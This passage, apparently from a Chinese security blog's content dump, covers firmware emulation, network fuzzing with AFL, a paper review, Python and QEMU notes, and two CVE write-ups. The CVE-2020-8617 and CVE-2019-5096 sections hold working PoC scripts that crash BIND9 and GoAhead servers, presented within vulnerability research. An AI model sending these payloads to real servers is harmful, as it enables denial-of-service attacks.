42 miniupnpd 84 26 smbd 866 120 telnetd 7728 399 tftpd 144 43 udhcpd 7894 245 utelnetd 44 17 没有仿真成功的测试程序有几种原因，一种原因是部分程序在启动时会对系统环境做详尽的检查，如检查运行进程、检查系统各种参数，当有一些条件没有满足时程序会退出，由于有一部分检查在可执行程序内部完成，不涉及到外部的调用或函数，本系统的技术不能控制，导致本系统不能成功的仿真。一种原因是部分程序依赖的设备较为特殊，是本文尚未实现的设备，在这种条件下本文也不能很好的进行仿真。 5. 后记5.1 本文缺陷本文通过对物联网设备模糊测试技术的研究，实现了对物联网设备中的网络应用程序进行仿真的目的。但是，本文的实现总体来说比较粗糙，有很多没有自动化或者不完善的部分，主要作为一种仿真的思路提出以供后来的研究者参考。 5.2 模糊测试工作在完成仿真后，要继续的工作是对仿真成功的二进制文件进行模糊测试，在仿真的基础上，还需要解决三个问题。即如何对网络程序进行测试、如何获取覆盖率反馈信息、如何对格式敏感的程序进行测试，对应的文章会在后续放出。 5.3 开源计划由于当前代码结构比较混乱、缺少文档，目前没有开源的计划，如果感兴趣的朋友比较多，等整理好代码后可能会通过这个 repo 开源。 6. 参考链接6.1 工具 QEMU Qiling Advanced Binary Emulation Framework Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, X86) firmadyne 6.2 论文 Towards Automated Dynamic Analysis for Linux-based Embedded Firmware AVATAR: A Framework to Support Dynamic Security Analysis of Embedded Systems’ Firmwares HALucinator: Firmware Re-hosting Through Abstraction Layer Emulation P2IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling","categories":[{"name":"IoT","slug":"IoT","permalink":"https://blog.lyle.ac.cn/categories/IoT/"}],"tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"https://blog.lyle.ac.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"一种基于AFL测试网络服务程序的小技巧","slug":"aflnw","date":"2020-12-18T09:03:28.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/12/18/aflnw/","link":"","permalink":"https://blog.lyle.ac.cn/2020/12/18/aflnw/","excerpt":"方案背景对于网络服务程序的模糊测试，当前的解决方案主要有：hook libc socket调用、修改afl、修改网络程序等，其中无论哪种方式，几乎都需要修改网络服务程序。","text":"方案背景对于网络服务程序的模糊测试，当前的解决方案主要有：hook libc socket调用、修改afl、修改网络程序等，其中无论哪种方式，几乎都需要修改网络服务程序。 AFLplusplus的开发者在仓库中推荐使用hook socket 的方案，这种方案灵感来源于preeny。基于 LD_PRELOAD hook libc中socket相关的函数将网络流转换为标准输入的IO，但是这种方案在一些复杂的网络程序中并不一定通用。 以nginx为例，在nginx启动后，程序会持续运行并监听对应的网络端口，如果没有异常并不会主动退出。而AFL需要每次重新启动程序，在这种场景下进行测试时就需要修改nginx的源代码。 另一个较为自然的方案是直接修改AFL传递输入的方式。这种方式中比较有代表性的是Monash University的研究者提出的aflnet。aflnet在afl的基础上，将标准输入修改为网络发包的方式，并加入了网络传输的功能，可以较为高效的测试网络服务程序。 但是afl的分支众多，有着不同的优劣势，也有着不同的应用场景。基于修改AFL的方案在移植其它优化策略时需要较大的工作量，另外aflnet同样需要对待测程序进行一定的修改以适应测试。 效率最高的方案是直接修改网络程序，调用对应的解析函数来进行测试，以bind9为例，其代码中就专门提供了用于Fuzz的部分。这种方式直接获取标准输入，传入核心函数中进行测试。这种方式的缺陷在于需要较为了解程序，且需要对目标程序进行定制开发。 解决方案那么能不能找到一种相对简单的方案，能够在不对AFL或者目标程序进行修改的基础上，较为简单的测试网络服务程序呢？ 考虑到AFL读取覆盖率是通过共享内存的方式，一个解决思路是，并不直接通过AFL启动程序，而是AFL启动辅助程序，AFL将标准输入传输辅助程序，辅助程序和网络程序进行交互。 具体来说，AFL启动辅助程序，辅助程序检查网络程序是否启动，若未启动，则启动待测的网络服务程序。此时 __AFL_SHM_ID 环境变量将传输待测网络服务程序中，基于AFL插桩的网络服务程序在测试时同样会记录覆盖率信息到当前的共享内存中。 每次进行新的测试时，辅助程序重复读取输入、将输入通过网络发送至目标网络服务程序的流程。而网络服务程序则不需要在启动流程中浪费运行时间，达到类似 persistent mode 的效果。 另外当网络服务程序失去响应时，辅助程序主动crash，使得AFL记录对应的crash输入。 程序的运行流程如下图所示： 最后，基于这种思路，完成了一个简单的实现，可以在这里查看。 参考链接 AFLplusplus preeny aflnet","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"https://blog.lyle.ac.cn/categories/Fuzz/"}],"tags":[{"name":"AFL","slug":"AFL","permalink":"https://blog.lyle.ac.cn/tags/AFL/"}]},{"title":"Usenix 2020 P²IM 论文阅读笔记","slug":"2020-7-4-p2im-reading-notes","date":"2020-07-04T02:52:36.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/07/04/2020-7-4-p2im-reading-notes/","link":"","permalink":"https://blog.lyle.ac.cn/2020/07/04/2020-7-4-p2im-reading-notes/","excerpt":"摘要对固件设备的测试通常受限于硬件支持，难以规模化，这在一定程度上导致了IoT漏洞的泛滥。因此文章提出了一种名为P²IM的方法，可以执行自动化的仿真测试。文章中对70个样例固件和10个真实设备的固件进行了测试，真实固件包括无人机、机器人、PLC等。在没有人工辅助的情况下，可以执行79%的固件。经过测试，文章找到了7个不同的bug。","text":"摘要对固件设备的测试通常受限于硬件支持，难以规模化，这在一定程度上导致了IoT漏洞的泛滥。因此文章提出了一种名为P²IM的方法，可以执行自动化的仿真测试。文章中对70个样例固件和10个真实设备的固件进行了测试，真实固件包括无人机、机器人、PLC等。在没有人工辅助的情况下，可以执行79%的固件。经过测试，文章找到了7个不同的bug。 论文信息 论文标题: P²IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling 论文作者: Bo Feng, Alejandro Mera, Long Lu 作者单位: Northeastern University 发表期刊：Usenix 发表时间：2020 研究背景文章主要目标是对微控制器（Microcontrollers, MCU）进行测试，微控制器是在特定场景下功耗更优的机器。MCU的固件通常包含：设备驱动、微型操作系统、系统库、一些特殊的逻辑&#x2F;应用等。 研究挑战对微控制器固件进行测试要解决的问题主要有硬件依赖、外设、多样化的系统设计，不完整的测试接口等。 硬件依赖主要是大部分之前的测试工作都依靠硬件完成，但是目前的硬件仿真并不完备，会在相当程度上影响测试效率。使用实体设备的话，在规模化时又会遇到问题。 此外，每一个固件都会和大量的外设有交互。这些外设是MCU厂商自定制的，有不同的接口和交互方式。因此通常需要不同的模拟器，需要大量的定制工作。 和平常使用的操作系统不同，MCU设备会使用更多的自定制系统&#x2F;系统库，有相当多样化的系统设计。这在模糊测试中也是需要考虑的。 普通的程序是基于标准I&#x2F;O或文件，但是固件大部分是从外设中直接读取的，测试接口并不完整，Fuzzer需要满足和设备的交互功能。 解决方案文章的主要贡献是提出了P²IM(Processor-Peripheral Interface Modeling)，即对外设进行自动化的建模来解决问题。MCU设备的外设有片上(on-chip)外设的，也有芯片外(off-chip)的外设，因为芯片无法直接控制 off-chip 这里文章仅考虑芯片上外设的建模。 这里主要使用抽象模型定义(Abstract Model Definition)和自动模块实例化(Automatic Model Instantiation)来完成模块。抽象模型定义基于专家经验定义模型，把寄存器分为控制寄存器、状态寄存器、数据寄存器、控制-状态寄存器。 自动模块实例化则基于之前的模型定义，基于执行对模型进行填充。主要是查找寄存器的类型、寄存器在内存中的位置、中断等。具体工作流如下图所示： 文章基于P²IE(Processor-Peripheral Interface Equivalence)来标定仿真的正确性，主要的三个指标为仿真器仿真了对应的外设接口、仿真器的行为和固件期望的行为一致、固件运行中没有crash&#x2F;hang或者跳过一些操作。 实验测试文章测试环境为 Intel® Core™ i5-7260U CPU @ 2.20GHz 8 GB RAM Ubuntu 16.04 。 单元测试文章选择了3个常用的MCU系统库(NuttX, RIOT, and Arduino)和3个MCU SoCs (STM32 F103RB, NXP MK64FN1M0VLL12, and Atmel SAM3X8E)来进行单元测试的实验。这些MCN SoC来自于不同的主要厂商，也被集成进入了不同的设备中。 基于上述的选择，文章找到了70个不同的样例固件用于测试。在这些测试例中，寄存器类型的正确判断率为 76% 到 92%。基于P²IE进行判断，测试的准确率达到了79%。 具体测试数据如下图： 真实设备测试文章选取了十个真实设备进行测试，包括自平衡机器人、PLC、网关、无人机等，这些设备更加复杂，多样性更多。在真实设备的测试中，文章取得了更好的结果，只有 8.2% 的寄存器误分类率。除了在 Soldering Iron 的两例误分类导致的运行终止外，框架均正确的运行。在最后，文章总共发现了7个不同的bug。 准确率数据如下图： 误分类数据如下图： 待完善项文章的未完善的部分主要是没有实现Direct Memory Access、只支持ARM架构。P²IM只实现了对寄存器和中断的，没有实现DMA的情况。这里主要是因为DMA依赖固件的设计，不同的固件间不同。加上文章在测试时只有不到十分之一的固件使用DMA，所以文章不对DMA进行实现。 在非ARM架构的MCU上，文章测试了三种不同架构的MCU，包括ATmega328P (AVR)、PIC32MX440F256H (MIPS)、FE310-G000 (RISC-V)。基于对架构的分析，作者认为这种方式是可以在不同架构间通用的。不过在一些特殊的架构(AVR)上，还需要一定的定制化支持。 参考链接 P²IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling","categories":[],"tags":[{"name":"论文阅读","slug":"论文阅读","permalink":"https://blog.lyle.ac.cn/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}]},{"title":"CVE-2020-8617 Bind9 DOS 漏洞","slug":"2020-7-1-cve-2020-8617","date":"2020-07-01T11:03:26.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/07/01/2020-7-1-cve-2020-8617/","link":"","permalink":"https://blog.lyle.ac.cn/2020/07/01/2020-7-1-cve-2020-8617/","excerpt":"简介CVE-2020-8617是由检查 TSIG 合理性的验证代码中的逻辑错误引发的，攻击者可以通过精心构造的payload触发 tsig.c 的失败断言，导致拒绝服务攻击。","text":"简介CVE-2020-8617是由检查 TSIG 合理性的验证代码中的逻辑错误引发的，攻击者可以通过精心构造的payload触发 tsig.c 的失败断言，导致拒绝服务攻击。 时间线 报告时间: 修复时间: 披露时间: 2020-5-19 漏洞影响范围 9.0.0 - 9.11.18 9.12.0 - 9.12.4-P2 9.14.0 - 9.14.11 9.16.0 - 9.16.2 9.13 &#x2F; 9.15 &#x2F; 9.17.0 development branch 9.9.3-S1 - 9.11.18-S1 复现复现环境1docker run --rm --name cve-2020-8617 -it -p 53:53/udp knqyf263/cve-2020-8617 PoC12345678from scapy.all import DNS, DNSQR, IP, sr1, UDP, DNSRRTSIG, DNSRROPTtsig = DNSRRTSIG(rrname=&quot;local-ddns&quot;, algo_name=&quot;hmac-sha256&quot;, rclass=255, mac_len=0, mac_data=&quot;&quot;, time_signed=0, fudge=300, error=16)dns_req = IP(dst=&#x27;127.0.0.1&#x27;)/UDP(dport=53)/DNS(rd=1, ad=1, qd=DNSQR(qname=&#x27;www.example.com&#x27;), ar=tsig)answer = sr1(dns_req, verbose=0)print(answer[DNS].summary()) 漏洞分析漏洞触发点是在 tsig.c dns_tsig_sign 函数。 12345678isc_result_tdns_tsig_sign(dns_message_t *msg) &#123; ... if (response &amp;&amp; msg-&gt;querytsig != NULL) &#123; dns_rdata_t querytsigrdata = DNS_RDATA_INIT; INSIST(msg-&gt;verified_sig); ...&#125; 运行PoC后报错为如下： 12301-Jul-2020 11:00:20.386 client @0x7fef400c4900 127.0.0.1#40631: request has invalid signature: TSIG local-ddns: tsig verify failure (BADTIME)01-Jul-2020 11:00:20.386 tsig.c:869: INSIST(msg-&gt;verified_sig) failed01-Jul-2020 11:00:20.386 exiting (due to assertion failure) 此时程序停止运行。 漏洞的 Patch 在 tsig.c 的 dns_tsig_verify 函数中 1234567891011121314151617181920@@ -1360,8 +1360,8 @@ dns_tsig_verify(isc_buffer_t *source, dns_message_t *msg, goto cleanup_context; &#125; msg-&gt;verified_sig = 1; &#125; else if (tsig.error != dns_tsigerror_badsig &amp;&amp; tsig.error != dns_tsigerror_badkey) &#125; else if (!response || (tsig.error != dns_tsigerror_badsig &amp;&amp; tsig.error != dns_tsigerror_badkey)) &#123; tsig_log(msg-&gt;tsigkey, 2, &quot;signature was empty&quot;); return (DNS_R_TSIGVERIFYFAILURE);@@ -1409,7 +1409,7 @@ dns_tsig_verify(isc_buffer_t *source, dns_message_t *msg, &#125; &#125; if (tsig.error != dns_rcode_noerror) &#123; if (response &amp;&amp; tsig.error != dns_rcode_noerror) &#123; msg-&gt;tsigstatus = tsig.error; if (tsig.error == dns_tsigerror_badtime) &#123; ret = DNS_R_CLOCKSKEW; 其中 if 条件的 response 代表是请求还是响应，if else 之前的条件为 if (tsig.siglen &gt; 0) &#123; 。 经过比较并结合PoC很容易分析出，这里是因为没有处理请求中 siglen 为0的情况，dns_tsig_verify 函数没有返回异常，代码继续运行，最后造成了校验不通过。 参考链接 bind9 PoC for CVE-2020-8617 (BIND) CVE-2020-8617: A logic error in code which checks TSIG validity can be used to trigger an assertion failure in tsig.c BIND 9 Security Vulnerability Matrix Fixed Commit mitre CVE-2020-8617","categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://blog.lyle.ac.cn/tags/CVE/"}]},{"title":"CVE-2019-5096 GoAhead Double Free 漏洞分析","slug":"cve-2019-5096","date":"2020-06-30T11:34:20.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/06/30/cve-2019-5096/","link":"","permalink":"https://blog.lyle.ac.cn/2020/06/30/cve-2019-5096/","excerpt":"简介GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器，提供开源和企业版本，用于全球数亿台设备中。CVE-2019-5096由思科 Talos 团队的研究员发现，可以在Pre-Auth的条件下触发漏洞。","text":"简介GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器，提供开源和企业版本，用于全球数亿台设备中。CVE-2019-5096由思科 Talos 团队的研究员发现，可以在Pre-Auth的条件下触发漏洞。 时间线 报告漏洞 2019-08-28 漏洞修复 2019-11-21 漏洞公开 2019-12-02 漏洞影响范围 GoAhead 5.0.1 GoAhead 3.6.5 GoAhead 4.1.1 复现PoC1234567import requestsurl = &#x27;http://127.0.0.1:8777&#x27;files = &#123; &quot;file1&quot;: (&#x27;filename&#x27;, &#x27;data&#x27;), &quot;file2&quot;: (&#x27;filename&#x27;, &#x27;data&#x27;),&#125;r = requests.post(url, files=files) 调用栈123456789101112131415161718...#2 0x00007ffff77c17ea in __libc_message (do_abort=do_abort@entry=0x2, fmt=fmt@entry=0x7ffff78daed8 &quot;*** Error in `%s&#x27;: %s: 0x%s ***\\n&quot;) at ../sysdeps/posix/libc_fatal.c:175#3 0x00007ffff77ca37a in malloc_printerr (ar_ptr=&lt;optimized out&gt;, ptr=&lt;optimized out&gt;, str=0x7ffff78dafe8 &quot;double free or corruption (out)&quot;, action=0x3) at malloc.c:5006#4 _int_free (av=&lt;optimized out&gt;, p=&lt;optimized out&gt;, have_lock=0x0) at malloc.c:3867#5 0x00007ffff77ce53c in __GI___libc_free (mem=&lt;optimized out&gt;) at malloc.c:2968#6 0x00007ffff7b2ee1c in wfree (mem=0x611260) at src/alloc.c:292#7 0x00007ffff7b4f1ba in freeUploadFile (up=0x6112a0) at src/upload.c:71#8 0x00007ffff7b4f236 in websFreeUpload (wp=0x60cbd0) at src/upload.c:88#9 0x00007ffff7b363c5 in termWebs (wp=0x60cbd0, reuse=0x0) at src/http.c:518#10 0x00007ffff7b365de in websFree (wp=0x60cbd0) at src/http.c:561#11 0x00007ffff7b3bc0b in checkTimeout (arg=0x60cbd0, id=0x1) at src/http.c:2362#12 0x00007ffff7b45785 in callEvent (id=0x1) at src/runtime.c:232#13 0x00007ffff7b459a5 in websRunEvents () at src/runtime.c:295#14 0x00007ffff7b38e82 in websServiceEvents (finished=0x60310c &lt;finished&gt;) at src/http.c:1389#15 0x0000000000401544 in main (argc=0x4, argv=0x7fffffffe4d8, envp=0x7fffffffe500) at src/goahead.c:170... 漏洞分析函数调用流程为 websProcessUploadData initUpload processContentBoundary processUploadHeader processContentData 其中 processUploadHeader 函数会调用 freeUploadFile free 掉 wp-&gt;currentFile 1234567static void processUploadHeader(Webs *wp, char *line)&#123; ... freeUploadFile(wp-&gt;currentFile); file = wp-&gt;currentFile = walloc(sizeof(WebsUpload)); ...&#125; processContentData 函数会把上传文件加入到 wp-&gt;files 中 1234567static bool processContentData(Webs *wp)&#123; ... hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), 0); defineUploadVars(wp); ...&#125; 在请求执行完毕后，会进入 termWebs -&gt; websFreeUpload 的执行流，将 wp-&gt;files 中的 WebsUpload 对象全部 free 一次。 123456789101112131415161718192021222324PUBLIC void websFreeUpload(Webs *wp)&#123; WebsUpload *up; WebsKey *s; if (wp-&gt;files &gt;= 0) &#123; for (s = hashFirst(wp-&gt;files); s; s = hashNext(wp-&gt;files, s)) &#123; up = s-&gt;content.value.symbol; freeUploadFile(up); if (up == wp-&gt;currentFile) &#123; wp-&gt;currentFile = 0; &#125; &#125; hashFree(wp-&gt;files); &#125; if (wp-&gt;currentFile) &#123; freeUploadFile(wp-&gt;currentFile); wp-&gt;currentFile = 0; &#125; if (wp-&gt;upfd &gt;= 0) &#123; close(wp-&gt;upfd); wp-&gt;upfd = -1; &#125;&#125; 可以看到漏洞触发点是在 freeUploadFile 函数，这里仅仅检查了 up-&gt;filename 的值。但是在上传多个文件时，之前的 WebsUpload 对象被 free 掉后仍然在链表中，会触发第二次 free。 123456789101112static void freeUploadFile(WebsUpload *up)&#123; if (up) &#123; if (up-&gt;filename) &#123; unlink(up-&gt;filename); wfree(up-&gt;filename); &#125; wfree(up-&gt;clientFilename); wfree(up-&gt;contentType); wfree(up); &#125;&#125; 漏洞Patch补丁修补方式为在 processContentData 函数加入链表后置 wp-&gt;currentFile 为空。 12345678static bool processContentData(Webs *wp)&#123; ... hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), 0); defineUploadVars(wp); wp-&gt;currentFile = 0; ...&#125; 参考链接 Vulnerability Spotlight: Two vulnerabilities in EmbedThis GoAhead CVE-2019-5096：GoAhead远程代码执行漏洞分析 CVE-2019-5096","categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://blog.lyle.ac.cn/tags/CVE/"}]},{"title":"Python 进程、线程与协程","slug":"python-coroutine-thread-and-process","date":"2020-06-15T11:48:12.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/06/15/python-coroutine-thread-and-process/","link":"","permalink":"https://blog.lyle.ac.cn/2020/06/15/python-coroutine-thread-and-process/","excerpt":"0x00 序在程序开发的过程中，会遇到协程、线程与进程之间的选择问题，对这些概念有清晰了解才能写出效率更高的代码。","text":"0x00 序在程序开发的过程中，会遇到协程、线程与进程之间的选择问题，对这些概念有清晰了解才能写出效率更高的代码。 0x01 进程对操作系统来说，进程是系统进行资源分配和调度的基本单位，每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。进程内至少有一个线程，它们共享进程的地址空间，而进程有自己独立的地址空间。 在多核的场景下，如果想要充分地使用多核CPU的资源，需要使用多进程的形式。Python提供了multiprocessing作为多进程的原生实现，提供了Process、Queue、Pipe、Lock等组件来支持子进程、通信和共享数据、执行不同形式的同步。 0x02 线程线程是操作系统能够进行运算调度的最小单位，它被包含在进程之中，是进程中的实际执行单位。 CPython的线程是操作系统的原生线程。在Linux上为pthread，在Windows上为Win thread，完全由操作系统调度线程的执行。一个Python解释器进程内有一个主线程，以及多个用户程序的执行线程。 2.1 GIL需要注意的是，即使在多核心CPU平台，由于GIL的存在，也将禁止多线程的并行执行。 GIL（Global Interpreter Lock）是全局解释器锁，存在于Python解释器中，用来确保当前只有一个线程被执行。GIL的存在保证了只有正在执行的线程才可以与解释器的内核进行通信，避免了混乱。 当一个线程遇到I&#x2F;O任务时，将释放GIL。I&#x2F;O 密集型的多线程程序 GIL 并不是瓶颈，但是计算密集型的多线程程序 GIL 会带来较大的性能损失。 2.2 最佳线程数在开发过程中，需要考虑CPU的核心数和利用率问题，常用的一个公式是 最佳线程数目 = ( ( 线程等待时间 + 线程CPU时间 ) / 线程CPU时间 ) * CPU数目 。 0x03 协程协程（Coroutine），又称微线程、纤程，它自带CPU的上下文，是比线程更小的执行单元。 协程有极高的执行效率，因为协程间切换是由程序自身控制的，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显。 Python可以基于greenlet、gevent库实现协程，也可以基于原生的yield生成器、asyncio异步协程来实现。 其中yield生成器的实现如下： 1234567891011121314151617181920212223242526def task1(): # 需要有 While True 来保证一直执行 while True: print(&quot;task 1 before yield&quot;) yield print(&quot;task 1 after yield&quot;)def task2(): while True: print(&quot;task 2 before yield&quot;) yield print(&quot;task 2 after yield&quot;) def main(): # 生成器对象 t1 = task1() t2 = task2() print(&quot;init&quot;) next(t1) print(&quot;switch from t1 to t2&quot;) next(t2) print(&quot;switch from t2 to t1&quot;) next(t1)if __name__ == &quot;__main__&quot;: main() 0x04 补充材料4.1 Amdahl 定律阿姆达尔定律（Amdahl’s law，Amdahl’s argument）是计算机科学界的经验法则，因 Gene Amdahl 而得名。它代表了处理器并行运算之后效率提升的能力。 阿姆达尔定律是计算总量不变时时的量化标准，可以使用公式 ((Ws + Wp) / (Ws + Wp / p)) 来表示。 0x05 参考链接 Python3 文档 协程与任务 Does PyPy have a GIL? Why? Amdahl’s law","categories":[{"name":"Programing","slug":"Programing","permalink":"https://blog.lyle.ac.cn/categories/Programing/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.lyle.ac.cn/tags/Python/"}]},{"title":"基于QEMU和binfmt-misc透明运行不同架构程序","slug":"transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc","date":"2020-04-14T03:23:47.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/04/14/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc/","link":"","permalink":"https://blog.lyle.ac.cn/2020/04/14/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc/","excerpt":"0x0 序基于qemu-user在x86架构上执行mips程序时，如果调用程序调用了 execve ，默认会使用x86的ld来载入程序，并抛出 exec format error 的错误信息。查询资料后发现Linux的binfmt-misc机制可以用户透明的实现调用不同架构程序的功能，于是进行了相关的尝试，于是将尝试的过程形成这篇文章，供之后查询。","text":"0x0 序基于qemu-user在x86架构上执行mips程序时，如果调用程序调用了 execve ，默认会使用x86的ld来载入程序，并抛出 exec format error 的错误信息。查询资料后发现Linux的binfmt-misc机制可以用户透明的实现调用不同架构程序的功能，于是进行了相关的尝试，于是将尝试的过程形成这篇文章，供之后查询。 0x1 binfmt_miscLinux内核有一个名为Miscellaneous Binary Format（binfmt_misc）的机制，可以通过要打开文件的特性来选择到底使用哪个程序来打开。这种机制可以通过文件的扩展名和文件开始位置的特殊的字节（Magic Byte）来判断应该如何打开文件。 可以通过以下命令来启用这种机制 1mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc 这种方式会在系统重新启动之后失效，可以通过在 /etc/fstab 文件中加入下面这行来实现开机启动： 1none /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0 已加载的程序可以通过 ls /proc/sys/fs/binfmt_misc/ 查看。 如果要加载新文件格式，可以通过向 /proc/sys/fs/binfmt_misc/register（该文件可写不可读）中写入一行匹配规则字符串来告诉内核以什么方式打开。 1:name:type:offset:magic:mask:interpreter:flags 这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。 各个字段的意义如下： name：规则名 type：表示如何匹配被打开的文件，值为 E 或 M 。E 表示根据扩展名识别，而 M 表示根据文件特定位置的Magic Bytes来识别 offset：type字段设置成 M 之后有效，表示查找Magic Bytes的偏移，默认为0 magic：表示要匹配的Magic Bytes，type字段为 M 时，表示文件的扩展名，扩展名是大小写敏感的，不需要包含 .。type字段为 E 时，表示Magic Bytes，其中不可见字符可以通过 \\xff 的方式来输出 mask：type字段设置成 M 之后有效，长度与Magic Bytes的长度一致。如果某一位为1，表示与magic对应的位匹配，为0则忽略。默认为全部匹配 interpreter：启动文件的程序，需要是绝对路径 flags: 可选字段，控制interpreter打开文件的行为。共支持 POCF 四种flag。 P 表示 preserve-argv[0] 保留原始的 argv[0] 参数。 O 表示 open-binary ，binfmt-misc默认会传递文件的路径，而启用这个参数时，binfmt-misc会打开文件，传递文件描述符。 C 表示 credentials ，即会传递文件的 setuid 等权限，这个选项也隐含了 O 。 F 表示 fix binary ，binfmt-misc默认的行为在 spwan 进程时会延迟，这种方式可能会受到mount namespace和chroot的影响，设置 F 时会立刻打开二进制文件。 除此之外，还有一些额外的限制条件： 每一行规则字符串的长度不能超过1920个字符 Magic Bytes必须在文件头128个字节内，即说offset+sizeof(magic)不超过128 interpreter的长度不能超过127 每次成功写入一行规则，都会在 /proc/sys/fs/binfmt_misc/ 目录下，创建一个名字为输入的匹配规则字符串中 name 字段的文件。通过读取这个文件的内容，可以知道这条匹配规则当前的状态： 1cat /proc/sys/fs/binfmt_misc/&lt;name&gt; 而通过向这个文件中写入0或1，可以关闭或打开这条匹配规则，而写入-1表示彻底删除这条规则。 0x2 QEMU配置apt包中有qemu相关的binfmt-misc配置，执行 apt install qemu-user-binfmt 即可安装。以 arm 为例，其配置如下： 1234567$ cat /proc/sys/fs/binfmt_misc/qemu-armenabledinterpreter /usr/bin/qemu-armflags: OCoffset 0magic 7f454c4601010100000000000000000002002800mask ffffffffffffff00fffffffffffffffffeffffff 需要自定义部分配置时，以 qemu-mips 为例，根据上文描述的规则，一个配置如下： 1echo &#x27;:qemu-mips:M:0:\\x7f\\x45\\x4c\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x08:\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xfe\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff:/qemu-mips:OC&#x27; &gt; /proc/sys/fs/binfmt_misc/register 需要注意的一点是 qemu-user-binfmt 会默认安装所有 qemu 支持的格式，如果需要自定义规则，需要先 echo -1 注销掉之前的规则。 0x3 环境配置仿真程序通常还涉及到不同架构的动态链接库，链接库的依赖有两种方式解决。一种方式是设置 QEMU_LD_PREFIX 环境变量，使得QEMU在加载程序时会在相应路径下寻找链接库。一种方式是通过 chroot ，创建一个新的 root 环境。其中要注意的是，chroot之后要注册相应的虚拟设备路径，同时 binfmt-misc 配置中的 qemu 路径也需要相应修改。 12345# 配置虚拟设备路径mount -t proc proc ./proc/mount -t sysfs sys ./sys/mount -o bind /dev ./dev/mount -o bind /dev/pts ./dev/pts 0x4 参考链接 Kernel Support for miscellaneous Binary Formats binfmt_misc wikipedia The real power of Linux executables Transparently running binaries from any architecture in Linux with QEMU and binfmt_misc linux下使用binfmt_misc设定不同二进制的打开程序","categories":[{"name":"Bin","slug":"Bin","permalink":"https://blog.lyle.ac.cn/categories/Bin/"}],"tags":[{"name":"QEMU","slug":"QEMU","permalink":"https://blog.lyle.ac.cn/tags/QEMU/"},{"name":"工具","slug":"工具","permalink":"https://blog.lyle.ac.cn/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"语言Tricks系列之一","slug":"tricks-1","date":"2020-04-13T13:08:29.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2020/04/13/tricks-1/","link":"","permalink":"https://blog.lyle.ac.cn/2020/04/13/tricks-1/","excerpt":"0x0 序最近遇到了不少各种语言的trick，于是想尝试作为一个系列记录下来。一般来说，并不提倡在生产环境中使用任何一种trick，好的代码应该是清晰的、无二义性的。部分trick更属于Undefined Behavior，这些trick在不同环境、不同版本的引擎中甚至会有截然不同的表现，在生产环境中应该避免这种情况。但是安全研究、渗透的过程中，利用这样的特性完成攻击的案例并不少见，所以仅作为研究还是有一定的意义。","text":"0x0 序最近遇到了不少各种语言的trick，于是想尝试作为一个系列记录下来。一般来说，并不提倡在生产环境中使用任何一种trick，好的代码应该是清晰的、无二义性的。部分trick更属于Undefined Behavior，这些trick在不同环境、不同版本的引擎中甚至会有截然不同的表现，在生产环境中应该避免这种情况。但是安全研究、渗透的过程中，利用这样的特性完成攻击的案例并不少见，所以仅作为研究还是有一定的意义。 0x1 代码与输出于是开始此系列的第一篇： 123456789101112var a = 0;console.log(1, a);if (true) &#123; console.log(2, a); a = 1; console.log(3, a); function a() &#123; &#125; console.log(4, a); a = 21; console.log(5, a);&#125;console.log(6, a); 以上代码在最新版nodejs的输出会是 1234561 02 [Function: a]3 14 15 216 1 这里是这个结果是这样出现的： 第一次输出 0 function a() 的定义提升 a 到全局，输出 [Function: a] 全局的 a 被赋值为 1 ，在console中输出两次 局部的 a 被赋值为 21 并在console中输出 全局的 a 在console中输出 0x2 调试过程以上的整个过程可以通过两种方式确定，一种方式是 node -print-bytecode ，打印出对应的字节码进行参考，具体的字节码如下。 123456789101112131415161718192021222324252627282930313233343536373839404142StackCheckLdaZero Star r1LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [7]Star r2CallProperty1 r2, r3, r1, [3]CreateClosure [2], [9], #2Star r0LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [12]Star r2CallProperty1 r2, r3, r0, [10]LdaSmi [1]Star r0LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [16]Star r2CallProperty1 r2, r3, r0, [14]Mov r0, r1LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [20]Star r2CallProperty1 r2, r3, r1, [18]LdaSmi [21]Star r0LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [24]Star r2CallProperty1 r2, r3, r0, [22]LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [28]Star r2CallProperty1 r2, r3, 